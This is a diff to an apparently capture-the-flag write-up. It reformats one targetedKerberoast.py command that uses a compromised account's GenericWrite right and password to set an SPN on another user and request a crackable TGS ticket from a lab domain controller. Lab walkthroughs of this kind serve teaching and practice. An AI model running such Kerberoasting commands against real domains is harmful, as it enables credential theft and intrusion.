@@ -154,11 +154,7 @@ BloodHound suggests **Targeted Kerberoast** as the abuse path.
 Using `jtrueblood`'s GenericWrite, we can set an SPN on `bbrown` and request a TGS:
 
 ```bash
-python3 targetedKerberoast.py -v \
-  -d 'shadow.gate' \
-  -u 'jtrueblood' \
-  -p 'blood_brothers' \
-  --dc-ip 10.1.6.240
+python3 targetedKerberoast.py -v -d 'shadow.gate' -u 'jtrueblood' -p 'blood_brothers' --dc-ip 10.1.6.240
 ```
 
 ![img](../assets/img/ShadowGate/8.png)
